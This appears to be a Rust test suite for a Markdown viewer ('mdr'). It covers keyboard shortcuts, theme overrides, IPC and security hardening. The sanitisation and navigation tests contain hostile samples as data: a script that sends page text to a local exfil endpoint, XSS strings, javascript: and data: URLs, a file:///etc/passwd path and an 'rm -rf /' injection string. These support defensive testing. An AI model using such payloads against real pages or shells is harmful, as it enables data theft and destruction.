    fn no_two_shortcuts_claim_the_same_binding() {
        let mut seen: Vec<&str> = Vec::new();
        for sc in SHORTCUTS {
            for binding in sc.bindings {
                assert!(
                    !seen.contains(binding),
                    "binding {:?} is claimed twice (second time by action {:?})",
                    binding,
                    sc.action
                );
                seen.push(binding);
            }
        }
    }

    #[test]
    fn every_shortcut_binding_is_a_canonical_token() {
        for sc in SHORTCUTS {
            for binding in sc.bindings {
                let key = binding.strip_prefix("mod+").unwrap_or(binding);
                assert!(!key.is_empty(), "empty key in action {:?}", sc.action);
                // Multi-character keys are DOM key names and must be lowercased,
                // so the JS dispatcher can match them after toLowerCase().
                assert!(
                    key.chars().count() == 1 || key == key.to_lowercase(),
                    "multi-char binding {:?} must be lowercase (action {:?})",
                    binding,
                    sc.action
                );
            }
        }
    }

    #[test]
    fn keyboard_script_exposes_a_handler_for_every_shortcut_action() {
        let script = keyboard_script();
        for sc in SHORTCUTS {
            assert!(
                script.contains(&format!("{}:", sc.action)),
                "no handler named {:?} in window.mdrActions",
                sc.action
            );
        }
    }

    #[test]
    fn keyboard_script_embeds_the_shortcut_table() {
        let script = keyboard_script();
        for sc in SHORTCUTS {
            assert!(
                script.contains(&format!(r#""action":"{}""#, sc.action)),
                "action {:?} missing from the embedded binding table",
                sc.action
            );
            for binding in sc.bindings {
                assert!(
                    script.contains(&format!(r#""{}""#, binding)),
                    "binding {:?} missing from the embedded binding table",
                    binding
                );
            }
        }
    }

    #[test]
    fn bare_letter_shortcuts_do_not_fire_while_typing_in_the_search_field() {
        // Bare keys like j/k/g/n would otherwise be swallowed as navigation
        // the moment the user types them into the search input.
        for sc in SHORTCUTS {
            let bare_letter = sc
                .bindings
                .iter()
                .any(|b| !b.starts_with("mod+") && b.chars().count() == 1);
            if bare_letter {
                assert!(
                    !sc.fires_while_typing,
                    "action {:?} binds a bare key and must not fire while typing",
                    sc.action
                );
            }
        }
        let script = keyboard_script();
        assert!(
            script.contains("firesWhileTyping"),
            "dispatcher must honour the firesWhileTyping flag"
        );
    }

    #[test]
    fn quit_shortcut_asks_the_native_window_to_close() {
        let script = keyboard_script();
        // JavaScript cannot close a wry window on its own; it must go through IPC.
        assert!(
            script.contains("ipc.postMessage") && script.contains(IPC_QUIT),
            "quit must post the {:?} IPC message, got: {}",
            IPC_QUIT,
            script
        );
    }

    #[test]
    fn help_overlay_documents_every_shortcut() {
        let help = build_shortcuts_help_html();
        for sc in SHORTCUTS {
            assert!(
                help.contains(sc.description),
                "help overlay is missing the description of {:?}",
                sc.action
            );
        }
    }

    #[test]
    fn help_overlay_escapes_shortcut_labels() {
        // Labels are rendered as HTML; a raw "<" would break the markup.
        let help = build_shortcuts_help_html();
        assert!(
            !help.contains("<kbd></kbd>"),
            "shortcut labels must not render empty, got: {}",
            help
        );
    }

    #[test]
    fn build_html_wires_up_the_keyboard_layer() {
        let html = build_html("<p>Hello</p>", &[]);
        assert!(
            html.contains("window.mdrActions"),
            "generated page must include the keyboard action table"
        );
        assert!(
            html.contains("shortcuts-overlay"),
            "generated page must include the shortcuts help overlay"
        );
    }

    // --- theme toggle ---

    #[test]
    fn theme_override_css_scopes_dark_rules_under_a_data_attribute() {
        let css = "@media (prefers-color-scheme: dark) { .foo { color: red; } }";
        let out = theme_override_css(css);
        assert!(
            out.contains(r#"html[data-theme="dark"] .foo"#),
            "dark media rules must be re-emitted under the dark data-theme, got: {}",
            out
        );
        assert!(
            !out.contains("@media"),
            "overrides must not stay behind a media query, got: {}",
            out
        );
    }

    #[test]
    fn theme_override_css_replaces_the_root_selector_instead_of_nesting_it() {
        let css = "@media (prefers-color-scheme: light) { :root { --bg: #fff; } }";
        let out = theme_override_css(css);
        assert!(
            out.contains(r#"html[data-theme="light"] { --bg: #fff; }"#),
            ":root must become the themed root itself, got: {}",
            out
        );
        assert!(
            !out.contains(":root"),
            ":root must not survive in the override, got: {}",
            out
        );
    }

    #[test]
    fn theme_override_css_handles_comma_separated_selectors() {
        let css = "@media (prefers-color-scheme: dark) { .a, .b { color: red; } }";
        let out = theme_override_css(css);
        assert!(
            out.contains(r#"html[data-theme="dark"] .a,html[data-theme="dark"] .b"#),
            "every selector in a list must be scoped, got: {}",
            out
        );
    }

    #[test]
    fn theme_override_css_ignores_non_theme_media_queries() {
        let css = "@media print { .a { color: red; } } @media (prefers-color-scheme: dark) { .b { color: blue; } }";
        let out = theme_override_css(css);
        assert!(
            !out.contains(".a"),
            "unrelated media queries must be left alone, got: {}",
            out
        );
        assert!(
            out.contains(".b"),
            "theme rules must be picked up, got: {}",
            out
        );
    }

    #[test]
    fn theme_toggle_overrides_cover_both_the_page_and_the_code_theme() {
        let html = build_html("<p><pre><code>x</code></pre></p>", &[]);
        assert!(
            html.contains(r#"html[data-theme="dark"]"#)
                && html.contains(r#"html[data-theme="light"]"#),
            "both themes must be available as explicit overrides"
        );
    }

    // --- IPC ---

    #[test]
    fn quit_request_is_recognised() {
        assert!(is_quit_request(IPC_QUIT));
    }

    // --- document sanitisation (#62) ---

    #[test]
    fn the_exfiltration_payload_does_not_survive_the_pipeline() {
        // The exact document from the report: a raw <script> in the Markdown
        // that navigates the window to an attacker-controlled host.
        let markdown = concat!(
            "# Notes\n\n",
            "<script>location.href=\"http://127.0.0.1:8765/exfil?d=\"",
            "+encodeURIComponent(document.body.innerText.slice(0,40));</script>\n",
        );
        let body = sanitize_document_html(&parse_markdown(markdown));
        let page = build_html(&body, &[]);

        assert!(!body.contains("127.0.0.1:8765"), "{body}");
        assert!(!body.contains("location.href"), "{body}");
        assert!(!page.contains("127.0.0.1:8765"), "payload reached the page");
        assert!(!page.contains("encodeURIComponent(document.body"), "{page}");
        assert!(
            page.contains("Notes"),
            "the document itself must still render"
        );
    }

    #[test]
    fn build_html_sanitises_the_body_on_its_own() {
        // Even a caller that forgets to sanitise cannot inject a script.
        let page = build_html(r#"<p>hi</p><script>alert(1)</script>"#, &[]);
        assert!(!page.contains("alert(1)"), "{page}");
        assert!(page.contains("<p>hi</p>"));
    }

    #[test]
    fn build_html_keeps_the_scripts_of_mdr_itself() {
        // The sanitiser runs on the document only: mdr's own inline scripts
        // must be untouched, or the page loses search, shortcuts and zoom.
        let page = build_html("<p>hi</p><pre><code>x</code></pre>", &[]);
        assert!(page.contains("window.mdrActions"), "keyboard layer missing");
        assert!(page.contains("window.searchNav"), "search layer missing");
        assert!(
            page.contains("hljs.highlightAll();"),
            "highlighting missing"
        );
        assert!(page.contains("expand-overlay"), "image zoom missing");
    }

    #[test]
    fn build_html_hardens_the_csp() {
        let page = build_html("<p>hi</p>", &[]);
        for directive in [
            "default-src 'none'",
            "object-src 'none'",
            "frame-src 'none'",
            "form-action 'none'",
            "base-uri 'none'",
            "connect-src 'none'",
            // Local images are inlined, so this one has to stay.
            "img-src data:",
        ] {
            assert!(page.contains(directive), "CSP misses {directive}: {page}");
        }
    }

    #[test]
    fn a_mermaid_diagram_still_reaches_the_page() {
        let md = "```mermaid\ngraph LR\n  A-->B\n```";
        let page = build_html(&parse_markdown(md), &[]);
        assert!(
            page.contains("mermaid-diagram")
                || page.contains("mermaid-error")
                || page.contains("mermaid-fallback")
                || page.contains(r#"class="mermaid""#),
            "sanitisation must not eat the Mermaid output"
        );
    }

    #[test]
    fn the_live_reload_script_carries_sanitised_html() {
        let dir = std::env::temp_dir();
        let js = document_swap_script("<script>alert(1)</script>\n\n# Title\n", &dir);
        assert!(!js.contains("alert(1)"), "{js}");
        assert!(js.contains("Title"), "{js}");
        assert!(js.contains(".content"), "{js}");
    }

    #[test]
    fn the_anchor_script_escapes_its_argument() {
        // The anchor comes from the document, so it has to be escaped, not
        // concatenated: the quote must come out backslashed.
        let js = scroll_to_anchor_script("a\");alert(1);//");
        assert!(js.contains(r#"getElementById("a\");alert(1);//")"#), "{js}");
    }

    // --- navigation (#55) ---

    #[test]
    fn the_initial_document_is_allowed_to_load() {
        let doc = Path::new("/docs/page.md");
        assert_eq!(navigation_decision("about:blank", doc), NavDecision::Allow);
        assert_eq!(navigation_decision("", doc), NavDecision::Allow);
    }

    #[test]
    fn http_links_go_to_the_system_browser() {
        let doc = Path::new("/docs/page.md");
        assert_eq!(
            navigation_decision("https://example.com/a", doc),
            NavDecision::OpenExternally("https://example.com/a".to_string())
        );
        assert_eq!(
            navigation_decision("http://example.com/a?b=1#c", doc),
            NavDecision::OpenExternally("http://example.com/a?b=1#c".to_string())
        );
        assert_eq!(
            navigation_decision("mailto:someone@example.com", doc),
            NavDecision::OpenExternally("mailto:someone@example.com".to_string())
        );
    }

    #[test]
    fn anchors_scroll_instead_of_navigating() {
        let doc = Path::new("/docs/page.md");
        assert_eq!(
            navigation_decision("#section-1", doc),
            NavDecision::Anchor("section-1".to_string())
        );
        // WebKit resolves the link against the about:blank base URL first.
        assert_eq!(
            navigation_decision("about:blank#section-1", doc),
            NavDecision::Anchor("section-1".to_string())
        );
    }

    #[test]
    fn a_local_markdown_file_is_opened_in_the_window() {
        let doc = Path::new("/docs/page.md");
        assert_eq!(
            navigation_decision("file:///docs/other.md", doc),
            NavDecision::OpenDocument(PathBuf::from("/docs/other.md"))
        );
        assert_eq!(
            navigation_decision("file:///docs/a%20b.markdown", doc),
            NavDecision::OpenDocument(PathBuf::from("/docs/a b.markdown"))
        );
        // Relative links, should the engine hand one over unresolved.
        assert_eq!(
            navigation_decision("other.md", doc),
            NavDecision::OpenDocument(PathBuf::from("/docs/other.md"))
        );
    }

    #[test]
    fn everything_else_is_refused() {
        let doc = Path::new("/docs/page.md");
        for url in [
            "file:///etc/passwd",
            "file:///docs/report.pdf",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox(1)",
            "ftp://example.com/x",
            "chrome://settings",
        ] {
            assert_eq!(
                navigation_decision(url, doc),
                NavDecision::Block,
                "{url} must be refused"
            );
        }
    }

    #[test]
    fn scheme_detection_does_not_trip_on_paths() {
        assert!(has_scheme("https://example.com"));
        assert!(has_scheme("javascript:alert(1)"));
        assert!(!has_scheme("notes/a:b.md"));
        assert!(!has_scheme("./other.md"));
        assert!(!has_scheme("other.md"));
    }

    #[test]
    fn unknown_ipc_messages_do_not_close_the_window() {
        // The page renders untrusted Markdown; a stray postMessage must not
        // be able to make anything but an exact quit request happen.
        for message in ["", "quit", "mdr:quit\n", " mdr:quit", "mdr:quit; rm -rf /"] {
            assert!(
                !is_quit_request(message),
                "{:?} must not be treated as a quit request",
                message
            );
        }
    }
}

#[cfg(test)]
mod scroll_tests {
    use super::*;

    /// Every scrolling shortcut must be wired to an action; a binding whose
    /// action is missing from `mdrActions` fails silently in the page.
    #[test]
    fn every_binding_has_an_action_in_the_script() {
        let js = keyboard_script();
        for shortcut in SHORTCUTS {
            assert!(
                js.contains(&format!("{}:", shortcut.action))
                    || js.contains(&format!("{}: ", shortcut.action)),
                "action {} is bound to {:?} but not defined in mdrActions",
                shortcut.action,
                shortcut.bindings
            );
        }
    }
}
